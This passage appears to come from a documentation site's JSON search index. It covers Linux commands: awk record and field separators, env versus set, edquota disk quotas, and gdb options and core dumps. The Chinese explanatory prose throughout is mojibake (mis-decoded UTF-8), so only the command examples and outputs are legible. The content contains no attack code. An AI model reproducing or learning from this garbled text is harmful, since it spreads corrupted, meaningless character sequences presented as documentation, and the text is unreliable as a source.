è®°å½•åˆ†éš”ç¬¦ï¼ˆé»˜è®¤æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦ï¼‰ã€‚ [N] RSTART ç”±matchå‡½æ•°æ‰€åŒ¹é…çš„å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚ [N] RLENGTH ç”±matchå‡½æ•°æ‰€åŒ¹é…çš„å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ [N] SUBSEP æ•°ç»„ä¸‹æ ‡åˆ†éš”ç¬¦ï¼ˆé»˜è®¤å€¼æ˜¯34ï¼‰ã€‚ BEGINæœ«å°¾çš„é0æ•°å­—è¡¨ç¤ºè¾“å‡º è¿™é‡Œé0æ•°å­—å¯ä»¥ç†è§£ä¸ºtrue: echo -e \"111\\n222\" | awk -v a=3 -v val=god 'BEGIN{FS=OFS=\",\"}{$a=val}1' 111,,god 222,,god awkä¸­$NFæ˜¯ä»€ä¹ˆæ„æ€? #pwd /usr/local/etc ~# echo $PWD | awk -F/ '{print $NF}' etc #NFä»£è¡¨ï¼šæµè§ˆè®°å½•çš„åŸŸçš„ä¸ªæ•° #$NFä»£è¡¨ ï¼šæœ€åä¸€ä¸ªField(åˆ—) åŸæ–‡é“¾æ¥:: https://blog.csdn.net/qq_41673534/article/details/80252016 linuxï¼šawkä¹‹RSã€ORSä¸FSã€OFS æŠŠORSç†è§£æˆRSåè¿‡ç¨‹ï¼Œè¿™æ ·æ›´å®¹æ˜“è®°å¿†å’Œç†è§£ ï¼Œçœ‹ä¸‹é¢çš„ä¾‹å­: [zhangy@localhost test]$ awk 'BEGIN{ORS=\"\\n\"}{print $0}' test1 //awk '{print $0}' test1äºŒè€…æ˜¯ä¸€æ ·çš„ 111 222 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{ORS=\"|\"}{print $0}' test1 111 222|333 444|555 666| FSä¸ºç©ºçš„æ—¶å€™: [zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"\"}{NF++;print $0}' 1 1 1 | 2 2 2 | 3 3 3 å½“FSä¸ºç©ºçš„æ—¶å€™ï¼Œawkä¼šæŠŠä¸€è¡Œä¸­çš„æ¯ä¸ªå­—ç¬¦ï¼Œå½“æˆä¸€åˆ—æ¥å¤„ç† ã€‚ å…³äºFieldä¸Record ä»€ä¹ˆæ˜¯fieldï¼ˆå­—æ®µï¼‰ï¼Œä»€ä¹ˆæ˜¯recordï¼ˆè®°å½•è¡Œï¼‰ï¼Ÿ ç¤ºä¾‹: 1.txt 1. i am a student. 2. i like to swim 3. hello moto 1ä»£è¡¨ç¬¬ä¸€ä¸ªè®°å½•è¡Œï¼Œ2ä»£è¡¨ç¬¬äºŒä¸ªè®°å½•è¡Œï¼Œ3ä»£è¡¨ç¬¬ä¸‰ä¸ªè®°å½•è¡Œã€‚ é€šè¿‡è§‚å¯Ÿæˆ‘ä»¬å¯ä»¥çŸ¥é“æ€»å…±æœ‰3ä¸ªè®°å½•è¡Œï¼ˆrecordï¼‰ã€‚ çœ‹çœ‹ç¬¬ä¸€è¡Œï¼š\"i am a student\"ï¼Œè¿™ä¸€è¡Œçš„æ¯ä¸ªå•è¯éƒ½æ˜¯ä¸€ä¸ªå­—æ®µï¼ˆfieldï¼‰ã€‚ \"i\"æ˜¯ä¸€ä¸ªå­—æ®µï¼Œ\"am\"æ˜¯ä¸€ä¸ªå­—æ®µï¼Œ\"a\"æ˜¯ä¸€ä¸ªå­—æ®µï¼Œ\"student\"æ˜¯ä¸€ä¸ªå­—æ®µï¼Œ è¯¥è¡Œæ€»å…±æœ‰4ä¸ªå­—æ®µã€‚ RS è®°å½•è¡Œåˆ†éš”ç¬¦, ç¤ºä¾‹: 1.txt 1. a\\n 2. b\\n 3. c\\n 4. d\\n 5. e\\n è¯¥æ–‡æœ¬æ€»å…±æœ‰5è¡Œï¼Œæ¯ä¸€è¡Œéƒ½æœ‰ä¸€ä¸ªæ¢è¡Œç¬¦\"n\"ã€‚ æ‰€ä»¥æ¯è¡Œè®°å½•éƒ½æ˜¯ä»¥\"n\"ä¸ºä¸€ä¸ªï¼ˆæ¢è¡Œçš„ï¼‰æ ‡å¿—ã€‚ å¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•æ¥ç†è§£ï¼š æ‰¾åˆ°æŸæŸæ ‡å¿—ï¼Œè®©æ¯ä¸ªæŸæŸåçš„å†…å®¹é‡æ–°å˜æˆä¸€è¡Œ ç¤ºä¾‹: 1.txt a|b|c ä»£ç : awk 'BEGIN{ RS=\"|\"; } { print $0 }' a b b ORS å¯ä»¥çœ‹æˆRSçš„é€†å‘è¿‡ç¨‹, ç¤ºä¾‹: 1.txt a b c å¯ä»¥è¿™æ ·ç†è§£ï¼š è§‚å¯Ÿæ¯ä¸€è¡Œçš„\"æ¢è¡Œç¬¦å·\"ï¼Œç„¶åå°†\"æ¢è¡Œç¬¦å·\"æ›¿æ¢æˆä½ æƒ³è¦çš„ç¬¦å·: awk 'BEGIN{ ORS=\"----\" }{ print $0 }' 1.txt a----b----c---- FS å­—æ®µåˆ†éš”ç¬¦ FSé»˜è®¤å€¼ä¸º\" ï¼ˆç©ºæ ¼ï¼‰\",å¦‚\"hello moto\". åœ¨\"hello moto\"ä¸­æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œç©ºæ ¼å°±æ˜¯helloä¸motoçš„åˆ†éš”ç¬¦ï¼ˆseparatorï¼‰ï¼Œè€Œhelloä¸motoå°±ä¸ºå­—æ®µï¼ˆfilesï¼‰ã€‚awkä»¥ç©ºæ ¼æ¥åŒºåˆ†ã€‚ åœ¨çœ‹çœ‹\"i----love----you\",å¦‚æœæˆ‘ä»¬ç”¨å‘½ä»¤\"awk \"{ print $1 }\"\"ä¼šçœ‹åˆ°ç»“æœä¸º: i----love----you å¦‚æœæƒ³æ‰“å°å‡ºä¸‰ä¸ªå­—æ¯ï¼Œé€šè¿‡è§‚å¯Ÿå¯å‘ç°\"----\"ä¸ºåˆ†éš”ç¬¦: awk 'BEGIN{ FS=\"----\";}{ print $1,$2,$3 }' filename i love you OFS è¾“å‡ºçš„å­—æ®µåˆ†éš”ç¬¦ã€‚ è¿™ä¹ˆè§£é‡Šå§ï¼Œå¦‚ä¸Šä¾‹ä¸­\"i----love----you\"ï¼Œ\"----\"ä¸ºåˆ†éš”ç¬¦(FS)ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æ”¹ä¸ºç”¨å…¶ä»–ç¬¦å·æ˜¾ç¤ºå¯ä»¥è¿™æ ·: awk 'BEGIN{ FS=\"----\";OFS=\"*****\" }{ print $1,$2,$3 }' filename i*****love*****you å…¶å®OFSè¿˜æœ‰ä¸€ä¸ªä¾‹å­: echo \"abc\" | awk '{ OFS=\".\" } { NF=NF; print NF,$0}' ç»“æœ: 1.abc PS RSä¸ORSå¯ä»¥è¯´æˆæ˜¯ä¸€ä¸ªäº’é€†çš„è¿‡ç¨‹ï¼ˆâ†”ï¼‰ä¹Ÿå¯ä»¥çœ‹æˆä¸€ä¸ªæ›¿æ¢çš„è¿‡ç¨‹ï¼Œ ä½†æ˜¯çœ‹æˆäº’é€†çš„è¿‡ç¨‹æ¯”è¾ƒå¥½ç†è§£ï¼›FSä¸OFSå°±æ˜¯ä¸€ä¸ªæ›¿æ¢çš„è¿‡ç¨‹ã€‚ RS,ORS,FS,OFSåŒºåˆ«å’Œè”ç³» å¹³å¸¸ç”¨çš„: print $0 ç­‰ä»·äº: printf $0 ORS RSä¸ORS RSæ˜¯è®°å½•åˆ†éš”ç¬¦ï¼Œé»˜è®¤çš„åˆ†éš”ç¬¦æ˜¯ \\n ï¼Œå…·ä½“ç”¨æ³•çœ‹ä¸‹: [root@krlcgcms01 mytest]# cat test1 //æµ‹è¯•æ–‡ä»¶ 111 222 333 444 555 666 RSé»˜è®¤åˆ†å‰²ç¬¦ \\n : [root@krlcgcms01 mytest]# awk '{print $0}' test1 //awk 'BEGIN{RS=\"\\n\"}{print $0}' test1 è¿™äºŒä¸ªæ˜¯ä¸€æ ·çš„ 111 222 333 444 555 666 å…¶å®ä½ å¯ä»¥æŠŠä¸Šé¢test1æ–‡ä»¶é‡Œçš„å†…å®¹ç†è§£ä¸º: 111 222\\n333 444\\n555 6666 åˆ©ç”¨ \\n è¿›è¡Œåˆ†å‰²ã€‚çœ‹ä¸‹ä¸€ä¸ªä¾‹å­ è‡ªå®šä¹‰RSåˆ†å‰²ç¬¦ : [zhangy@localhost test]$ echo \"111 222|333 444|555 666\"|awk 'BEGIN{RS=\"|\"}{print $0,RT}' 111 222 | 333 444 | 555 666 ç»“åˆä¸Šé¢ä¸€ä¸ªä¾‹å­ï¼Œå°±å¾ˆå®¹æ˜“ç†è§£RSçš„ç”¨æ³•äº† RSä¹Ÿå¯èƒ½æ˜¯æ­£åˆ™è¡¨è¾¾å¼ : [zhangy@localhost test]$ echo \"111 222a333 444b555 666\"|awk 'BEGIN{RS=\"[a-z]+\"}{print $1,RS,RT}' 111 [a-z]+ a 333 [a-z]+ b 555 [a-z]+ ä»ä¾‹3å’Œä¾‹4ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ç‚¹ï¼Œ å½“RTæ˜¯åˆ©ç”¨RSåŒ¹é…å‡ºæ¥çš„å†…å®¹ã€‚å¦‚æœRSæ˜¯æŸä¸ªå›ºå®šçš„å€¼æ—¶ï¼ŒRTå°±æ˜¯RSçš„å†…å®¹ ã€‚ RSä¸ºç©ºæ—¶ : [zhangy@localhost test]$ cat -n test2 1 111 222 2 3 333 444 4 333 444 5 6 7 555 666 [zhangy@localhost test]$ awk 'BEGIN{RS=\"\"}{print $0}' test2 111 222 333 444 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{RS=\"\";}{print \"<\",$0,\">\"}' test2 //è¿™ä¸ªä¾‹å­çœ‹ç€æ¯”è¾ƒæ˜æ˜¾ < 111 222 > < 333 444 //è¿™ä¸€è¡Œå’Œä¸‹é¢ä¸€è¡Œï¼Œæ˜¯ä¸€è¡Œ 333 444 > < 555 666 > ä»è¿™ä¸ªä¾‹å­ï¼Œ å¯ä»¥çœ‹å‡ºå½“RSä¸ºç©ºæ—¶ï¼Œawkä¼šè‡ªåŠ¨ä»¥å¤šè¡Œæ¥åšä¸ºåˆ†å‰²ç¬¦ ã€‚ ORSè®°å½•è¾“å‡ºåˆ†ç¬¦ç¬¦ï¼Œé»˜è®¤å€¼æ˜¯ ``n`` æŠŠORSç†è§£æˆRSåè¿‡ç¨‹ï¼Œè¿™æ ·æ›´å®¹æ˜“è®°å¿†å’Œç†è§£ ï¼Œçœ‹ä¸‹é¢çš„ä¾‹å­: [zhangy@localhost test]$ awk 'BEGIN{ORS=\"\\n\"}{print $0}' test1 //awk '{print $0}' test1äºŒè€…æ˜¯ä¸€æ ·çš„ 111 222 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{ORS=\"|\"}{print $0}' test1 111 222|333 444|555 666| FSä¸OFS FSæŒ‡å®šåˆ—åˆ†å‰²ç¬¦ : [zhangy@localhost test]$ echo \"111|222|333\"|awk '{print $1}' 111|222|333 [zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"|\"}{print $1}' 111 FSä¹Ÿå¯ä»¥ç”¨æ­£åˆ™ : [zhangy@localhost test]$ echo \"111||222|333\"|awk 'BEGIN{FS=\"[|]+\"}{print $1}' 111 FSä¸ºç©ºçš„æ—¶å€™ : [zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"\"}{NF++;print $0}' 1 1 1 | 2 2 2 | 3 3 3 å½“FSä¸ºç©ºçš„æ—¶å€™ï¼Œawkä¼šæŠŠä¸€è¡Œä¸­çš„æ¯ä¸ªå­—ç¬¦ï¼Œå½“æˆä¸€åˆ—æ¥å¤„ç† ã€‚ RSè¢«è®¾å®šæˆé ``n`` æ—¶ï¼Œ ``n`` ä¼šæˆFSåˆ†å‰²ç¬¦ä¸­çš„ä¸€ä¸ª [zhangy@localhost test]$ cat test1 111 222 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{RS=\"444\";}{print $2,$3}' test1 222 333 666 222å’Œ333ä¹‹é—´æ˜¯æœ‰ä¸€ä¸ª ``n`` çš„ï¼Œå½“RSè®¾å®šæˆ444åï¼Œ222å’Œ333è¢«è®¤å®šæˆåŒä¸€è¡Œçš„äºŒåˆ—äº†ï¼Œå…¶å®æŒ‰å¸¸è§„æ€æƒ³æ˜¯äºŒè¡Œçš„ä¸€åˆ—æ‰å¯¹ ã€‚ OFSåˆ—è¾“å‡ºåˆ†éš”ç¬¦ [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $1,$2}' test1 111|222 333|444 555|666 [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $1 OFS $2}' test1 111|222 333|444 555|666 test1åªæœ‰äºŒåˆ—ï¼Œå¦‚æœ100åˆ—ï¼Œéƒ½å†™å‡ºæ¥å¤ªéº»çƒ¦äº†å§ã€‚ [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $0}' test1 111 222 333 444 555 666 [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{NF=NF;print $0}' test1 111|222 333|444 555|666 ä¸ºä»€ä¹ˆç¬¬äºŒç§æ–¹æ³•ä¸­çš„OFSç”Ÿæ•ˆå‘¢ï¼Ÿä¸ªäººè§‰å¾—ï¼Œ awkè§‰æŸ¥åˆ°åˆ—æœ‰æ‰€å˜åŒ–æ—¶ï¼Œå°±ä¼šè®©OFSç”Ÿæ•ˆ ï¼Œæ²¡å˜åŒ–ç›´æ¥è¾“å‡ºäº†ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AWK.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AWK.html"},{"title":"env","text":"env æ˜¾ç¤ºç³»ç»Ÿä¸­å·²ç»å­˜åœ¨çš„ç¯å¢ƒå˜é‡ï¼ˆå½“å‰ç”¨æˆ·ï¼‰ï¼Œåªä½¿ç”¨\"-\"æ—¶ï¼Œéšè—äº†\"-i\"çš„åŠŸèƒ½ -i å¼€å§‹ä¸€ä¸ªæ–°çš„ç©ºç¯å¢ƒ -u <å˜é‡å> ä»å½“å‰ç¯å¢ƒä¸­åˆ é™¤æŒ‡å®šçš„å˜é‡ å…¶ä»–ç”¨æ³•, ä¸´æ—¶ä¸ºæŸä¸ªæ‰§è¡Œçš„cmdè®¾ç½®ä¸€ä¸ªç¯å¢ƒå˜é‡, ä»…åœ¨æ‰§è¡Œçš„è¿™ä¸ªcmdç”Ÿæ•ˆ: env var=xxx cmd setä¸åŠ ä»»ä½•å‚æ•°æ˜¾ç¤ºç»“æœäºenvçš„åŒºåˆ« set å‘½ä»¤ set å‘½ä»¤ä¼šæ˜¾ç¤ºå½“å‰ shell çš„ç¯å¢ƒå˜é‡å’Œä½ç½®å‚æ•°ï¼Œ ä»¥åŠå…¶ä»–ä¸å½“å‰ shell ä¼šè¯ç›¸å…³çš„è®¾ç½®ï¼ˆå¦‚ shell å‡½æ•°å’Œåˆ«åï¼‰. å®ƒè¿˜ä¼šæ˜¾ç¤ºä¸€äº›å†…éƒ¨å˜é‡å’ŒçŠ¶æ€ä¿¡æ¯. è¾“å‡ºç»“æœåŒ…å«æ›´å¤šä¸ shell ç›¸å…³çš„ä¿¡æ¯ï¼Œè€Œä¸ä»…ä»…æ˜¯ç¯å¢ƒå˜é‡. æ­¤å¤–ï¼Œset å‘½ä»¤è¿˜å¯ä»¥ç”¨äºè®¾ç½®å˜é‡æˆ–ä¿®æ”¹ shell çš„è¡Œä¸º. env å‘½ä»¤ env å‘½ä»¤ä¼šæ˜¾ç¤ºå½“å‰ç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡. å®ƒä¸»è¦ç”¨äºæ˜¾ç¤ºç¯å¢ƒå˜é‡çš„å€¼ï¼Œè€Œä¸åŒ…å«å…¶ä»–ä¸ shell ä¼šè¯ç›¸å…³çš„ä¿¡æ¯. env å‘½ä»¤çš„è¾“å‡ºç»“æœé€šå¸¸æ¯”è¾ƒç®€æ´ï¼ŒåªåŒ…å«ç¯å¢ƒå˜é‡çš„åç§°å’Œå€¼ã€‚ åŒºåˆ« /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/æŒ‡ä»¤exportã€envã€setä¸‰è€…çš„åŒºåˆ«","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ENV.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ENV.html"},{"title":"edquota","text":"ä¿®æ”¹ç”¨æˆ·ï¼ˆç¾¤ç»„ï¼‰çš„ç£ç›˜é…é¢ edit quota ç¼©å†™ï¼Œç”¨äºä¿®æ”¹ç”¨æˆ·å’Œç¾¤ç»„çš„é…é¢é™åˆ¶å‚æ•°ï¼Œ åŒ…æ‹¬ç£ç›˜å®¹é‡å’Œæ–‡ä»¶ä¸ªæ•°é™åˆ¶ã€è½¯é™åˆ¶å’Œç¡¬é™åˆ¶å€¼ã€å®½é™æ—¶é—´ï¼Œ è¯¥å‘½ä»¤çš„åŸºæœ¬æ ¼å¼æœ‰ä»¥ä¸‹ 3 ç§: [root@localhost ~]# edquota [-u ç”¨æˆ·å] [-g ç¾¤ç»„å] [root@localhost ~]# edquota -t [root@localhost ~]# edquota -p æºç”¨æˆ·å -u æ–°ç”¨æˆ·å æ­¤å‘½ä»¤å„å¸¸ç”¨é€‰é¡¹åŠåŠŸèƒ½å¦‚ä¸‹ï¼š -u ç”¨æˆ·å è¿›å…¥é…é¢çš„ Vi ç¼–è¾‘ç•Œé¢ï¼Œä¿®æ”¹é’ˆå¯¹ç”¨æˆ·çš„é…ç½®å€¼ï¼› -g ç¾¤ç»„å è¿›å…¥é…é¢çš„ Vi ç¼–è¾‘ç•Œé¢ï¼Œä¿®æ”¹é’ˆå¯¹ç¾¤ç»„çš„é…ç½®å€¼ï¼› -t ä¿®æ”¹é…é¢å‚æ•°ä¸­çš„å®½é™æ—¶é—´ï¼› -p å°†æºç”¨æˆ·ï¼ˆæˆ–ç¾¤ç»„ï¼‰çš„ç£ç›˜é…é¢è®¾ç½®ï¼Œå¤åˆ¶ç»™å…¶ä»–ç”¨æˆ·ï¼ˆæˆ–ç¾¤ç»„ï¼‰ ä¾‹å¦‚ï¼Œä»¥ç”¨æˆ· myquota ä¸ºä¾‹ï¼Œé€šè¿‡å¦‚ä¸‹å‘½ä»¤é…ç½®æ­¤å‘½ä»¤çš„ Quota: [root@localhost ~]# edquota -u myquota Disk quotas for user myquota (uid 710): Filesystem blocks soft hard inodes soft hard /dev/hda3 80 0 0 10 0 0 æ­¤å‘½ä»¤çš„è¾“å‡ºä¿¡æ¯å…± 3 è¡Œï¼Œ ç¬¬ä¸€è¡ŒæŒ‡æ˜äº†é’ˆå¯¹å“ªä¸ªç”¨æˆ·è¿›è¡Œé…é¢é™åˆ¶ï¼Œ ç¬¬äºŒè¡Œæ˜¯å„ä¸ªé…é¢å€¼çš„è¡¨å¤´ï¼Œ å…±åˆ†ä¸º 7 åˆ—ï¼Œå…¶æ¯ä¸€åˆ—çš„å«ä¹‰ æ–‡ä»¶ç³»ç»Ÿï¼ˆfilesystemï¼‰ è¯´æ˜è¯¥é™åˆ¶å€¼æ˜¯é’ˆå¯¹å“ªä¸ªæ–‡ä»¶ç³»ç»Ÿï¼ˆæˆ–åˆ†åŒºï¼‰ï¼› ç£ç›˜å®¹é‡ï¼ˆblocksï¼‰ æ­¤åˆ—çš„æ•°å€¼æ˜¯ quota è‡ªå·±ç®—å‡ºæ¥çš„ï¼Œå•ä½ä¸º Kbytesï¼Œä¸è¦æ‰‹åŠ¨ä¿®æ”¹ï¼› ç£ç›˜å®¹é‡çš„è½¯é™åˆ¶ï¼ˆsoftï¼‰ å½“ç”¨æˆ·ä½¿ç”¨çš„ç£ç›˜ç©ºé—´è¶…è¿‡æ­¤é™åˆ¶å€¼ï¼Œåˆ™ç”¨æˆ·åœ¨ç™»é™†æ—¶ä¼šæ”¶åˆ°è­¦å‘Šä¿¡æ¯ï¼Œå‘ŠçŸ¥ç”¨æˆ·ç£ç›˜å·²æ»¡ï¼Œå•ä½ä¸º KBï¼› ç£ç›˜å®¹é‡çš„ç¡¬é™åˆ¶ï¼ˆhardï¼‰ è¦æ±‚ç”¨æˆ·ä½¿ç”¨çš„ç£ç›˜ç©ºé—´æœ€å¤§ä¸èƒ½è¶…è¿‡æ­¤é™åˆ¶å€¼ï¼Œå•ä½ä¸º KBï¼› æ–‡ä»¶æ•°é‡ï¼ˆinodesï¼‰ åŒ blocks ä¸€æ ·ï¼Œæ­¤é¡¹ä¹Ÿæ˜¯ quotaè‡ªå·±è®¡ç®—å‡ºæ¥çš„ï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹ï¼› æ–‡ä»¶æ•°é‡çš„è½¯é™åˆ¶ï¼ˆsoftï¼‰ å½“ç”¨æˆ·æ‹¥æœ‰çš„æ–‡ä»¶æ•°é‡è¶…è¿‡æ­¤å€¼ï¼Œç³»ç»Ÿä¼šå‘å‡ºè­¦å‘Šä¿¡æ¯ï¼› æ–‡ä»¶æ•°é‡çš„ç¡¬é™åˆ¶ï¼ˆhardï¼‰ ç”¨æˆ·æ‹¥æœ‰çš„æ–‡ä»¶æ•°é‡ä¸èƒ½è¶…è¿‡æ­¤å€¼ã€‚ æ³¨æ„ï¼Œå½“ soft/hard ä¸º 0 æ—¶ï¼Œè¡¨ç¤ºæ²¡æœ‰é™åˆ¶ã€‚ å¦å¤–ï¼Œåœ¨ Viï¼ˆæˆ– Vimï¼‰ä¸­ä¿®æ”¹é…é¢å€¼æ—¶ï¼Œå¡«å†™çš„æ•°æ®æ— æ³•ä¿è¯åŒè¡¨å¤´å¯¹é½ï¼Œ åªè¦ä¿è¯æ­¤è¡Œæ•°æ®åˆ†ä¸º 7 ä¸ªæ ç›®å³å¯ã€‚ ã€ä¾‹ 1ã€‘ ä¿®æ”¹ç”¨æˆ· myquota çš„è½¯é™åˆ¶å€¼å’Œç¡¬é™åˆ¶å€¼: [root@localhost ~]# edquota -u myquota Disk quotas for user myquota (uid 710): Filesystem blocks soft hard inodes soft hard /dev/hda3 80 250000 300000 10 0 0 ã€ä¾‹ 2ã€‘ ä¿®æ”¹ç¾¤ç»„ mygrpquota çš„é…é¢: [root@localhost ~]# edquota -g mygrpquota Disk quotas for group mygrpquota (gid 713): Filesystem blocks soft hard inodes soft hard /dev/hda3 400 900000 1000000 50 0 0 ã€ä¾‹ 3ã€‘ä¿®æ”¹å®½é™å¤©æ•°: [root@localhost ~]# edquota -t Grace period before enforcing soft limits for users: Time units may be: days, hours, minutes, or seconds Filesystem Block grace period Inode grace period /dev/hda3 14days 7days","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Edquota.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Edquota.html"},{"title":"gdb","text":"ä½¿ç”¨: bt #æ‰“å°å½“å‰çš„å †æ ˆä¿¡æ¯ backtrace å¸¸ç”¨æ¨¡æ¿: gdb exefile corefile -x script gdb --core corefile exefile -x script gbd -c corefile exefile -x script gdb exefile corefile < script å‰ä¸‰è€…åŸºæœ¬ç­‰ä»·ï¼Œæœ€åä¸€ä¸ªä¸ç¡®å®š å¸¸ç”¨é€‰é¡¹ -n x , -n ä¸æ‰§è¡Œä»»ä½•åˆå§‹åŒ–æ–‡ä»¶é‡Œçš„å‘½ä»¤ã€‚é€šå¸¸åœ¨å¤„ç†æ‰€æœ‰çš„å‘½ä»¤æ­¤é€‰é¡¹å’Œå‚æ•°ä¹‹åï¼ŒGDB ä¼šæ‰§è¡Œè¿™äº›æ–‡ä»¶é‡Œçš„å‘½ä»¤ã€‚ -q uite , -s ilent , -q \"å®‰é™æ¨¡å¼\"ï¼Œä¸æ‰“å°ä»‹ç»å’Œç‰ˆæƒä¿¡æ¯ã€‚åœ¨æ‰¹å¤„ç†æ¨¡å¼ä¸‹ä¹Ÿä¸æ‰“å°ã€‚ -b atch ä»¥æ‰¹å¤„ç†æ¨¡å¼è¿è¡Œã€‚ å¤„ç†å®Œæ‰€æœ‰å‘½ä»¤æ–‡ä»¶åä»¥ 0 çŠ¶æ€æ¨å‡ºã€‚æ‰¹å¤„ç†æ¨¡å¼å°†åœ¨ GDB ä½œä¸ºè¿‡æ»¤å™¨è¿çš„æ—¶å€™å¾ˆæœ‰ç”¨ï¼Œä¾‹å¦‚ä¸‹è½½å’Œè¿è¡Œä¸€ä¸ªè¿œç¨‹è®¡ç®—æœºä¸Šçš„ç¨‹åºã€‚ -symbols <file>, -s <file> ä»æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å–ç¬¦å·è¡¨ã€‚ -se <file> ä»æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–ç¬¦å·è¡¨ä¿¡æ¯ï¼Œå¹¶æŠŠå®ƒç”¨åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ -core <file>, -c <file> è°ƒè¯• core dump çš„ core æ–‡ä»¶ï¼Œ core dump å«åšæ ¸å¿ƒè½¬å‚¨ï¼Œå®ƒæ˜¯è¿›ç¨‹è¿è¡Œæ—¶åœ¨çªç„¶å´©æºƒçš„é‚£ä¸€åˆ»çš„ä¸€ä¸ªå†…å­˜å¿«ç…§ï¼Œæ“ä½œç³»ç»Ÿåœ¨ç¨‹åºå‘ç”Ÿå¼‚ å¸¸è€Œå¼‚å¸¸åœ¨è¿›ç¨‹å†…éƒ¨åˆæ²¡æœ‰è¢«æ•è·çš„æƒ…å†µä¸‹ï¼Œä¼šæŠŠè¿›ç¨‹æ­¤åˆ»å†…å­˜ã€å¯„å­˜å™¨çŠ¶æ€ã€è¿è¡Œå †æ ˆç­‰ä¿¡æ¯è½¬å‚¨ä¿å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œã€‚ -directory <directory>, -d <directory> åŠ å…¥ä¸€ä¸ªæºæ–‡ä»¶çš„æœç´¢è·¯å¾„ã€‚é»˜è®¤æœç´¢è·¯å¾„æ˜¯ç¯å¢ƒå˜é‡ä¸­çš„ PATH æ‰€å®šä¹‰çš„è·¯å¾„ã€‚ -tty device, -t device å°†è®¾å¤‡ä½œä¸ºç¨‹åºçš„æ ‡å‡†è¾“å…¥è¾“å‡ºã€‚ -t ui åœ¨å¯åŠ¨æ—¶æ¿€æ´»æ–‡æœ¬ç”¨æˆ·æ¥å£ã€‚æ–‡æœ¬ç”¨æˆ·æ¥å£åœ¨ç»ˆç«¯ä¸Šç®¡ç†å¤šç§æ–‡æœ¬çª—å£ï¼Œç”¨æ¥æ˜¾ç¤ºä»£ç ï¼Œæ±‡ç¼–ï¼Œå¯„å­˜å™¨å’Œ GDB å‘½ä»¤çš„è¾“å‡ºã€‚ -w rite ä»¥å¯è¯»å¯å†™çš„æ–¹å¼æ‰“å¼€å¯æ‰§è¡Œç¨‹åºå’Œ core æ–‡ä»¶ï¼Œå’Œ set write on å‘½ä»¤ç›¸åŒã€‚ -s tatistics åœ¨æ¯æ¬¡å®Œæˆå‘½ä»¤å’Œå›æ”¶åˆ°æç¤ºç¬¦çš„æ—¶å€™ï¼Œæ­¤é€‰é¡¹å¯è®© GDB æ‰“å°æ—¶é—´å’Œå†…å­˜ä½¿ç”¨ç»Ÿè®¡ä¿¡æ¯ã€‚ -v ersion æ­¤é€‰é¡¹å¯è®© GDB æ‰“å°ç‰ˆæœ¬å·å’Œéä¿éšœæ€§çš„å£°æ˜ç„¶åé€€å‡º å¸¸ç”¨çš„command code: run #è¿è¡Œ info xxx #æ˜¾ç¤ºxxxä¿¡æ¯ bt #æ˜¾ç¤ºå †æ ˆ continue #ä¸­æ–­åç»§ç»­è¿è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ step #å•æ­¥æ‰§è¡Œï¼Œè¿›å…¥å‡½æ•° next #å•æ­¥æ‰§è¡Œ return #å‡½æ•°æœªæ‰§è¡Œå®Œï¼Œå¿½ç•¥æœªæ‰§è¡Œçš„è¯­å¥ï¼Œè¿”å›ã€‚ finish #å‡½æ•°æ‰§è¡Œå®Œæ¯•è¿”å›ã€‚ call #è°ƒç”¨æŸä¸€ä¸ªå‡½æ•° fun(\"1234\") (backtrace)bt #æ˜¾ç¤ºæ ˆæ¡¢ bt N #æ˜¾ç¤ºå¼€å¤´Nä¸ªæ ˆæ¡¢ bt -N #æ˜¾ç¤ºæœ€åNä¸ªæ ˆæ¡¢ (frame)f N #æ˜¾ç¤ºç¬¬Nå±‚æ ˆæ¡¢ list #æ˜¾ç¤ºæºç  set directory #è®¾ç½®gdbçš„å·¥ä½œç›®å½• pwd #å½“å‰çš„å·¥ä½œç›®å½• å…³äºgdbçš„coreæ–‡ä»¶ Core Dump Coreçš„æ„æ€æ˜¯å†…å­˜ï¼ŒDumpçš„æ„æ€æ˜¯æ‰”å‡ºæ¥ï¼Œå †å‡ºæ¥ã€‚ å¼€å‘å’Œä½¿ç”¨Unixç¨‹åºæ—¶ï¼Œæœ‰æ—¶ç¨‹åºè«åå…¶å¦™çš„downäº†ï¼Œå´æ²¡æœ‰ä»»ä½•çš„æç¤º(æœ‰æ—¶å€™ä¼šæç¤ºcore dumped)ï¼Œ è¿™æ—¶å€™å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å½¢å¦‚ core.è¿›ç¨‹å· çš„æ–‡ä»¶ç”Ÿæˆï¼Œ 